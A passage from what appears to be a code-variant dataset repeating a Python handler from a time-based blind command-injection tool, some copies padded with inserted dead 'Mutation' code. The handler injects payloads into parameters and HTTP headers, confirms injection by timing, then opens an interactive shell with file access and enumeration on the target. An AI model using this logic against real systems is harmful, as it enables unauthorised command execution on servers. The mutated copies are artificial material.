whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            if settings.FILE_ACCESS_DONE == True:\n                                while True:\n                                    message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                    file_access_again = common.read_input(message, default='N', check_batch=True)\n                                    if file_access_again in settings.CHOICE_YES:\n                                        if not menu.options.ignore_session:\n                                            menu.options.ignore_session = True\n                                        tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                        break\n                                    elif file_access_again in settings.CHOICE_NO:\n                                        break\n                                    elif file_access_again in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(file_access_again)\n                                        pass\n                            elif menu.file_access_options():\n                                tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            if menu.options.os_cmd:\n                                cmd = menu.options.os_cmd\n                                (check_how_long, output) = tb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            try:\n                                checks.alert()\n                                go_back = False\n                                go_back_again = False\n                                while True:\n                                    if go_back == True:\n                                        break\n                                    message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                    if settings.CRAWLING:\n                                        settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                    if not settings.STDIN_PARSING:\n                                        gotshell = common.read_input(message, default='Y', check_batch=True)\n                                    else:\n                                        gotshell = common.read_input(message, default='n', check_batch=True)\n                                    if gotshell in settings.CHOICE_YES:\n                                        print(settings.OS_SHELL_TITLE)\n                                        if settings.READLINE_ERROR:\n                                            checks.no_readline_module()\n                                        while True:\n                                            if false_positive_warning:\n                                                warn_msg = 'Due to unexpected time delays, it is highly '\n                                                warn_msg += \"recommended to enable the 'reverse_tcp' option.\\n\"\n                                                sys.stdout.write('\\r' + settings.print_warning_msg(warn_msg))\n                                                false_positive_warning = False\n                                            if not settings.READLINE_ERROR:\n                                                checks.tab_autocompleter()\n                                            sys.stdout.write(settings.OS_SHELL)\n                                            cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                            cmd = checks.escaped_cmd(cmd)\n                                            if cmd.lower() in settings.SHELL_OPTIONS:\n                                                (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE='')\n                                                if go_back and go_back_again == False:\n                                                    break\n                                                if go_back and go_back_again:\n                                                    return True\n                                            else:\n                                                if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                    (check_how_long, output) = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                                    tb_injector.export_injection_results(cmd, separator, output, check_how_long)\n                                                    if not menu.options.ignore_session:\n                                                        session_handler.store_cmd(url, cmd, output, vuln_parameter)\n                                                else:\n                                                    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                                    print(settings.print_output(output))\n                                                logs.executed_command(filename, cmd, output)\n                                    elif gotshell in settings.CHOICE_NO:\n                                        if checks.next_attack_vector(technique, go_back) == True:\n                                            break\n                                        elif no_result == True:\n                                            return False\n                                        else:\n                                            return True\n                                    elif gotshell in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(gotshell)\n                                        pass\n                            except (KeyboardInterrupt, SystemExit):\n                                raise\n                            except EOFError:\n                                if settings.STDIN_PARSING:\n                                    print(settings.SINGLE_WHITESPACE)\n                                err_msg = 'Exiting, due to EOFError.'\n                                print(settings.print_error_msg(err_msg))\n                                raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
            "def tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    counter = 1\n    num_of_chars = 1\n    vp_flag = True\n    no_result = True\n    is_encoded = False\n    possibly_vulnerable = False\n    false_positive_warning = False\n    export_injection_info = False\n    how_long = 0\n    if settings.VERBOSITY_LEVEL != 0:\n        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '. '\n        print(settings.print_info_msg(info_msg))\n    if menu.options.maxlen:\n        settings.MAXLEN = maxlen = menu.options.maxlen\n    if menu.options.url_reload == True:\n        warn_msg = \"The '--url-reload' option is not available in \" + technique + '.'\n        print(settings.print_warning_msg(warn_msg))\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    how_long_statistic = []\n                    if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):\n                        try:\n                            settings.TIME_BASED_STATE = True\n                            cmd = shell = ''\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                            settings.FOUND_HOW_LONG = how_long\n                            settings.FOUND_DIFF = how_long - timesec\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    if settings.RETEST == True:\n                        settings.RETEST = False\n                        from src.core.injections.results_based.techniques.classic import cb_handler\n                        cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)\n                    if not settings.LOAD_SESSION:\n                        num_of_chars = num_of_chars + 1\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        alter_shell = menu.options.alter_shell\n                        TAG = ''.join((random.choice(string.ascii_uppercase) for num_of_chars in range(6)))\n                        tag_length = len(TAG) + 4\n                        for output_length in range(1, int(tag_length)):\n                            try:\n                                if alter_shell:\n                                    payload = tb_payloads.decision_alter_shell(separator, TAG, output_length, timesec, http_request_method)\n                                else:\n                                    payload = tb_payloads.decision(separator, TAG, output_length, timesec, http_request_method)\n                                payload = parameters.prefixes(payload, prefix)\n                                payload = parameters.suffixes(payload, suffix)\n                                payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                                payload = checks.perform_payload_modification(payload)\n                                if settings.VERBOSITY_LEVEL != 0:\n                                    payload_msg = payload.replace('\\n', '\\\\n')\n                                    print(settings.print_payload(payload_msg))\n                                if settings.COOKIE_INJECTION == True:\n                                    vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                    how_long = tb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                                elif settings.USER_AGENT_INJECTION == True:\n                                    vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                    how_long = tb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                                elif settings.REFERER_INJECTION == True:\n                                    vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                    how_long = tb_injector.referer_injection_test(url, vuln_parameter, payload)\n                                elif settings.HOST_INJECTION == True:\n                                    vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                    how_long = tb_injector.host_injection_test(url, vuln_parameter, payload)\n                                elif settings.CUSTOM_HEADER_INJECTION == True:\n                                    vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                    how_long = tb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                                else:\n                                    (how_long, vuln_parameter) = tb_injector.injection_test(payload, http_request_method, url)\n                                how_long_statistic.append(how_long)\n                                percent = num_of_chars * 100 / total\n                                float_percent = '{0:.1f}'.format(round(num_of_chars * 100 / (total * 1.0), 2))\n                                if percent == 100 and no_result == True:\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = settings.FAIL_STATUS\n                                    else:\n                                        percent = ''\n                                elif url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                                    false_positive_fixation = False\n                                    if len(TAG) == output_length:\n                                        statistical_anomaly = True\n                                        if len(set(how_long_statistic[0:5])) == 1:\n                                            if max(xrange(len(how_long_statistic)), key=lambda x: how_long_statistic[x]) == len(TAG) - 1:\n                                                statistical_anomaly = False\n                                                how_long_statistic = []\n                                        if timesec <= how_long and (not statistical_anomaly):\n                                            false_positive_fixation = True\n                                        else:\n                                            false_positive_warning = True\n                                    if false_positive_warning:\n                                        message = 'Unexpected time delays have been identified due to unstable '\n                                        message += 'requests. This behavior may lead to false positive results. '\n                                        sys.stdout.write('\\r')\n                                        while True:\n                                            message = message + 'How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > '\n                                            proceed_option = common.read_input(message, default='C', check_batch=True)\n                                            if proceed_option.lower() in settings.CHOICE_PROCEED:\n                                                if proceed_option.lower() == 's':\n                                                    false_positive_fixation = False\n                                                    raise\n                                                elif proceed_option.lower() == 'c':\n                                                    timesec = timesec + 1\n                                                    false_positive_fixation = True\n                                                    break\n                                                elif proceed_option.lower() == 'q':\n                                                    raise SystemExit()\n                                            else:\n                                                common.invalid_option(proceed_option)\n                                                pass\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                        sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                        sys.stdout.flush()\n                                    if false_positive_fixation:\n                                        false_positive_fixation = False\n                                        settings.FOUND_HOW_LONG = how_long\n                                        settings.FOUND_DIFF = how_long - timesec\n                                        if false_positive_warning:\n                                            time.sleep(1)\n                                        randv1 = random.randrange(1, 10)\n                                        randv2 = random.randrange(1, 10)\n                                        randvcalc = randv1 + randv2\n                                        if settings.TARGET_OS == settings.OS.WINDOWS:\n                                            if alter_shell:\n                                                cmd = settings.WIN_PYTHON_INTERPRETER + 'python.exe -c \"print (' + str(randv1) + ' + ' + str(randv2) + ')\"'\n                                            else:\n                                                rand_num = randv1 + randv2\n                                                cmd = 'powershell.exe -InputFormat none write (' + str(rand_num) + ')'\n                                        else:\n                                            cmd = 'expr ' + str(randv1) + ' %2B ' + str(randv2) + ''\n                                        original_how_long = how_long\n                                        (how_long, output) = tb_injector.false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response, false_positive_warning)\n                                        if url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                                            if str(output) == str(randvcalc) and len(TAG) == output_length:\n                                                possibly_vulnerable = True\n                                                how_long_statistic = 0\n                                                if settings.VERBOSITY_LEVEL == 0:\n                                                    percent = settings.info_msg\n                                                else:\n                                                    percent = ''\n                                        else:\n                                            break\n                                    else:\n                                        if settings.VERBOSITY_LEVEL == 0:\n                                            percent = '.. (' + str(float_percent) + '%)'\n                                            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                            sys.stdout.flush()\n                                        continue\n                                else:\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                        sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                        sys.stdout.flush()\n                                    continue\n                            except (KeyboardInterrupt, SystemExit):\n                                print(settings.SINGLE_WHITESPACE)\n                                raise\n                            except EOFError:\n                                if settings.STDIN_PARSING:\n                                    print(settings.SINGLE_WHITESPACE)\n                                err_msg = 'Exiting, due to EOFError.'\n                                print(settings.print_error_msg(err_msg))\n                                raise\n                            except:\n                                percent = num_of_chars * 100 / total\n                                float_percent = '{0:.1f}'.format(round(num_of_chars * 100 / (total * 1.0), 2))\n                                if str(float_percent) == '100.0':\n                                    if no_result == True:\n                                        if settings.VERBOSITY_LEVEL == 0:\n                                            percent = settings.FAIL_STATUS\n                                            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                            sys.stdout.flush()\n                                        else:\n                                            percent = ''\n                                    else:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        print(settings.SINGLE_WHITESPACE)\n                                        logs.logs_notification(filename)\n                                else:\n                                    percent = '.. (' + str(float_percent) + '%)'\n                            break\n                    if url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                        if len(TAG) == output_length and (possibly_vulnerable == True or (settings.LOAD_SESSION and int(is_vulnerable) == menu.options.level)):\n                            found = True\n                            no_result = False\n                            settings.DETECTION_PHASE = False\n                            settings.EXPLOITATION_PHASE = True\n                            if settings.LOAD_SESSION:\n                                possibly_vulnerable = False\n                            if settings.COOKIE_INJECTION == True:\n                                header_name = ' cookie'\n                                found_vuln_parameter = vuln_parameter\n                                the_type = ' parameter'\n                            elif settings.USER_AGENT_INJECTION == True:\n                                header_name = ' User-Agent'\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            elif settings.REFERER_INJECTION == True:\n                                header_name = ' Referer'\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                                found_vuln_parameter = ''\n                                the_type = ' HTTP header'\n                            else:\n                                header_name = ''\n                                the_type = ' parameter'\n                                if not settings.USER_DEFINED_POST_DATA:\n                                    found_vuln_parameter = parameters.vuln_GET_param(url)\n                                else:\n                                    found_vuln_parameter = vuln_parameter\n                            if len(found_vuln_parameter) != 0:\n                                found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                            if export_injection_info == False:\n                                export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                            if vp_flag == True:\n                                vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                            logs.update_payload(filename, counter, payload)\n                            counter = counter + 1\n                            if not settings.LOAD_SESSION:\n                                if settings.VERBOSITY_LEVEL == 0:\n                                    print(settings.SINGLE_WHITESPACE)\n                                else:\n                                    checks.total_of_requests()\n                            info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                            info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                            print(settings.print_bold_info_msg(info_msg))\n                            sub_content = str(checks.url_decode(payload))\n                            print(settings.print_sub_content(sub_content))\n                            if not settings.LOAD_SESSION:\n                                shell = ''\n                                session_handler.injection_point_importation(url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, original_how_long, output_length, is_vulnerable=menu.options.level)\n                            else:\n                                whitespace = settings.WHITESPACES[0]\n                                settings.LOAD_SESSION = False\n                            if settings.ENUMERATION_DONE == True:\n                                while True:\n                                    message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                    enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                    if enumerate_again in settings.CHOICE_YES:\n                                        if not menu.options.ignore_session:\n                                            menu.options.ignore_session = True\n                                        tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                        break\n                                    elif enumerate_again in settings.CHOICE_NO:\n                                        break\n                                    elif enumerate_again in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(enumerate_again)\n                                        pass\n                            elif menu.enumeration_options():\n                                tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            if settings.FILE_ACCESS_DONE == True:\n                                while True:\n                                    message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                    file_access_again = common.read_input(message, default='N', check_batch=True)\n                                    if file_access_again in settings.CHOICE_YES:\n                                        if not menu.options.ignore_session:\n                                            menu.options.ignore_session = True\n                                        tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                        break\n                                    elif file_access_again in settings.CHOICE_NO:\n                                        break\n                                    elif file_access_again in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(file_access_again)\n                                        pass\n                            elif menu.file_access_options():\n                                tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            if menu.options.os_cmd:\n                                cmd = menu.options.os_cmd\n                                (check_how_long, output) = tb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                            try:\n                                checks.alert()\n                                go_back = False\n                                go_back_again = False\n                                while True:\n                                    if go_back == True:\n                                        break\n                                    message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                    if settings.CRAWLING:\n                                        settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                    if not settings.STDIN_PARSING:\n                                        gotshell = common.read_input(message, default='Y', check_batch=True)\n                                    else:\n                                        gotshell = common.read_input(message, default='n', check_batch=True)\n                                    if gotshell in settings.CHOICE_YES:\n                                        print(settings.OS_SHELL_TITLE)\n                                        if settings.READLINE_ERROR:\n                                            checks.no_readline_module()\n                                        while True:\n                                            if false_positive_warning:\n                                                warn_msg = 'Due to unexpected time delays, it is highly '\n                                                warn_msg += \"recommended to enable the 'reverse_tcp' option.\\n\"\n                                                sys.stdout.write('\\r' + settings.print_warning_msg(warn_msg))\n                                                false_positive_warning = False\n                                            if not settings.READLINE_ERROR:\n                                                checks.tab_autocompleter()\n                                            sys.stdout.write(settings.OS_SHELL)\n                                            cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                            cmd = checks.escaped_cmd(cmd)\n                                            if cmd.lower() in settings.SHELL_OPTIONS:\n                                                (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE='')\n                                                if go_back and go_back_again == False:\n                                                    break\n                                                if go_back and go_back_again:\n                                                    return True\n                                            else:\n                                                if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                    (check_how_long, output) = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)\n                                                    tb_injector.export_injection_results(cmd, separator, output, check_how_long)\n                                                    if not menu.options.ignore_session:\n                                                        session_handler.store_cmd(url, cmd, output, vuln_parameter)\n                                                else:\n                                                    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                                    print(settings.print_output(output))\n                                                logs.executed_command(filename, cmd, output)\n                                    elif gotshell in settings.CHOICE_NO:\n                                        if checks.next_attack_vector(technique, go_back) == True:\n                                            break\n                                        elif no_result == True:\n                                            return False\n                                        else:\n                                            return True\n                                    elif gotshell in settings.CHOICE_QUIT:\n                                        raise SystemExit()\n                                    else:\n                                        common.invalid_option(gotshell)\n                                        pass\n                            except (KeyboardInterrupt, SystemExit):\n                                raise\n                            except EOFError:\n                                if settings.STDIN_PARSING:\n                                    print(settings.SINGLE_WHITESPACE)\n                                err_msg = 'Exiting, due to EOFError.'\n                                print(settings.print_error_msg(err_msg))\n                                raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
            "def tb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    counter = 1\n    num_of_chars = 1\n    vp_flag = True\n    no_result = True\n    is_encoded = False\n    possibly_vulnerable = False\n    false_positive_warning = False\n    export_injection_info = False\n    how_long = 0\n    if settings.VERBOSITY_LEVEL != 0:\n        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '. '\n        print(settings.print_info_msg(info_msg))\n    if menu.options.maxlen:\n        settings.MAXLEN = maxlen = menu.options.maxlen\n    if menu.options.url_reload == True:\n        warn_msg = \"The '--url-reload' option is not available in \" + technique + '.'\n        print(settings.print_warning_msg(warn_msg))\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    how_long_statistic = []\n                    if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):\n                        try:\n                            settings.TIME_BASED_STATE = True\n                            cmd = shell = ''\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                            settings.FOUND_HOW_LONG = how_long\n                            settings.FOUND_DIFF = how_long - timesec\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    if settings.RETEST == True:\n                        settings.RETEST = False\n                        from src.core.injections.results_based.techniques.classic import cb_handler\n                        cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)\n                    if not settings.LOAD_SESSION:\n                        num_of_chars = num_of_chars + 1\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        alter_shell = menu.options.alter_shell\n                        TAG = ''.join((random.choice(string.ascii_uppercase) for num_of_chars in range(6)))\n                        tag_length = len(TAG) + 4\n                        for output_length in range(1, int(tag_length)):\n                            try:\n                                if alter_shell:\n                                    payload = tb_payloads.decision_alter_shell(separator, TAG, output_length, timesec, http_request_method)\n                                else:\n                                    payload = tb_payloads.decision(separator, TAG, output_length, timesec, http_request_method)\n                                payload = parameters.prefixes(payload, prefix)\n                                payload = parameters.suffixes(payload, suffix)\n                                payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                                payload = checks.perform_payload_modification(payload)\n                                if settings.VERBOSITY_LEVEL != 0:\n                                    payload_msg = payload.replace('\\n', '\\\\n')\n                                    print(settings.print_payload(payload_msg))\n                                if settings.COOKIE_INJECTION == True:\n                                    vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                    how_long = tb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                                elif settings.USER_AGENT_INJECTION == True:\n                                    vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                    how_long = tb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                                elif settings.REFERER_INJECTION == True:\n                                    vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                    how_long = tb_injector.referer_injection_test(url, vuln_parameter, payload)\n                                elif settings.HOST_INJECTION == True:\n                                    vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                    how_long = tb_injector.host_injection_test(url, vuln_parameter, payload)\n                                elif settings.CUSTOM_HEADER_INJECTION == True:\n                                    vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                    how_long = tb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                                else:\n                                    (how_long, vuln_parameter) = tb_injector.injection_test(payload, http_request_method, url)\n                                how_long_statistic.append(how_long)\n                                percent = num_of_chars * 100 / total\n                                float_percent = '{0:.1f}'.format(round(num_of_chars * 100 / (total * 1.0), 2))\n                                if percent == 100 and no_result == True:\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = settings.FAIL_STATUS\n                                    else:\n                                        percent = ''\n                                elif url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                                    false_positive_fixation = False\n                                    if len(TAG) == output_length:\n                                        statistical_anomaly = True\n                                        if len(set(how_long_statistic[0:5])) == 1:\n                                            if max(xrange(len(how_long_statistic)), key=lambda x: how_long_statistic[x]) == len(TAG) - 1:\n                                                statistical_anomaly = False\n                                                how_long_statistic = []\n                                        if timesec <= how_long and (not statistical_anomaly):\n                                            false_positive_fixation = True\n                                        else:\n                                            false_positive_warning = True\n                                    if false_positive_warning:\n                                        message = 'Unexpected time delays have been identified due to unstable '\n                                        message += 'requests. This behavior may lead to false positive results. '\n                                        sys.stdout.write('\\r')\n                                        while True:\n                                            message = message + 'How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > '\n                                            proceed_option = common.read_input(message, default='C', check_batch=True)\n                                            if proceed_option.lower() in settings.CHOICE_PROCEED:\n                                                if proceed_option.lower() == 's':\n                                                    false_positive_fixation = False\n                                                    raise\n                                                elif proceed_option.lower() == 'c':\n                                                    timesec = timesec + 1\n                                                    false_positive_fixation = True\n                                                    break\n                                                elif proceed_option.lower() == 'q':\n                                                    raise SystemExit()\n                                            else:\n                                                common.invalid_option(proceed_option)\n                                                pass\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                        sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                        sys.stdout.flush()\n                                    if false_positive_fixation:\n                                        false_positive_fixation = False\n                                        settings.FOUND_HOW_LONG = how_long\n                                        settings.FOUND_DIFF = how_long - timesec\n                                        if false_positive_warning:\n                                            time.sleep(1)\n                                        randv1 = random.randrange(1, 10)\n                                        randv2 = random.randrange(1, 10)\n                                        randvcalc = randv1 + randv2\n                                        if settings.TARGET_OS == settings.OS.WINDOWS:\n                                            if alter_shell:\n                                                cmd = settings.WIN_PYTHON_INTERPRETER + 'python.exe -c \"print (' + str(randv1) + ' + ' + str(randv2) + ')\"'\n                                            else:\n                                                rand_num = randv1 + randv2\n                                                cmd = 'powershell.exe -InputFormat none write (' + str(rand_num) + ')'\n                                        else:\n                                            cmd = 'expr ' + str(randv1) + ' %2B ' + str(randv2) + ''\n                                        original_how_long = how_long\n                                        (how_long, output) = tb_injector.false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response, false_positive_warning)\n                                        if url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):\n                                            if str(output) == str(randvcalc) and len(TAG) == output_length:\n                                                possibly_vulnerable = True\n                                                how_long_statistic = 0\n                                                if settings.VERBOSITY_LEVEL == 0:\n                                                    percent = settings.info_msg\n                                                else:\n                                                    percent = ''\n                                        else:\n                                            break\n                                    else:\n                                        if settings.VERBOSITY_LEVEL == 0:\n                                            percent = '.. (' + str(float_percent) + '%)'\n                                            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                            sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                            sys.stdout.flush()\n                                        continue\n                                else:\n                                    if settings.VERBOSITY_LEVEL == 0:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                        sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                        sys.stdout.flush()\n                                    continue\n                            except (KeyboardInterrupt, SystemExit):\n                                print(settings.SINGLE_WHITESPACE)\n                                raise\n                            except EOFError:\n                                if settings.STDIN_PARSING:\n                                    